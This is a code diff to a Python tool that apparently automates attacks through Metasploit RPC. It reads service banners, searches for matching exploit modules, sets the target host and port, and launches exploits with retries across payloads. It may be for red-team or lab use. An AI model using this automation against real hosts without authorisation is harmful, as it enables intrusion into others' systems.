@@ -1,7 +1,10 @@
 import platform
 import random
+from http.client import ResponseNotReady
 from subprocess import run
 from time import sleep
+
+from celery.exceptions import SoftTimeLimitExceeded
 from typing import List
 
 from metasploit.msfrpc import MsfRpcClient, MsfRpcError
@@ -43,21 +46,26 @@ def _slow_msf_search(client: MsfRpcClient, query: str):
     exploits = client.modules.exploits
     results = []
     for e in exploits:
-        exploit = client.modules.use('exploit', e)
+        try:
+            exploit = client.modules.use('exploit', e)
+        except ResponseNotReady:
+            exploit = client.modules.use('exploit', e)
         if query.lower() in exploit.name.decode().lower() + exploit.description.decode().lower():
             results.append(e)
     return results
 
 
 def msf_search(client: MsfRpcClient, query: str) -> List[str]:
-    cached = storage.smembers('metasploit:' + query)
+    cached = storage.exists('metasploit:' + query)
     if not cached:
-        print("Cache miss, using slow MSF search")
+        print("Cache miss, using slow MSF search for", query)
         results = _slow_msf_search(client, query)
         for result in results:
             storage.sadd('metasploit:' + query, result.decode())
+        if not results:
+            storage.sadd('metasploit:' + query, 0)
         return results
-    return list(cached)
+    return list(storage.smembers('metasploit:' + query))
 
 
 def get_lock() -> str:
@@ -89,22 +97,52 @@ def msf_attack(host: str, *args, **kwargs):
     target = get_hosts()[host]
     query = ""
     port = None
-    for p in random.sample(list(target['ports']), len(target['ports'])):
-        if p.get('banner'):
+    # Loop through available services in random order, stop when there is a banner
+    index = 1
+    for p, data in random.sample(target['ports'].items(), len(target['ports'])):
+        if data.get('banner'):
             # Naive banner parsing
-            query = p['banner'].split()[1]
             if query.lower() in ["microsoft", "windows"]:
-                query = p['banner'].split()[2]
-            port = p['port']
+                index = 2
+            port = p
             break
-    exploit = random.choice(msf_search(client, query))
-    exploit = client.modules.use('exploit', exploit)
+    exploit = None
+    print(data['banner'])
+    while not exploit and index < len(data['banner'].split()):
+        exploit = None
+        print("Getting exploit")
+        try:
+            query = data['banner'].split()[index]
+            if query.endswith(':'):
+                index += 1
+                continue
+            print("Query: " + query)
+            try:
+                mod = random.choice(msf_search(client, query))
+            except SoftTimeLimitExceeded:
+                MSF.log("We're running out of time while trying to search. Increase task timeout to prevent this.",
+                        "warning")
+                return
+            exploit = client.modules.use('exploit', mod)
+        except (IndexError, MsfRpcError):
+            index += 1
+    if not exploit:
+        MSF.log("Couldn't find exploit.", "warning")
+        print("Couldn't find exploit.")
+        return
+    print("Went with " + str(exploit.modulename))
     MSF.log("Using exploit {} against {}:{}".format(exploit.modulename, host, port))
     for r in exploit.required:
         if r == b'RHOST':
             exploit['RHOST'.encode()] = host
         elif r == b'RPORT':
             exploit['RPORT'.encode()] = port
-    # TODO: Payloads?
-    e = exploit.execute(payload=exploit.payloads[0].decode())
-    MSF.log('Exploit ' + exploit.modulename + ' against ' + host + ' launched.', 'success')
+    execute = None
+    p = 0
+    while p < len(exploit.payloads) and not execute:
+        try:
+            execute = exploit.execute(payload=exploit.payloads[p].decode())
+        except ValueError:
+            p += 1
+        else:
+            MSF.log('Exploit ' + str(exploit.modulename) + ' against ' + host + ' launched.', 'success')
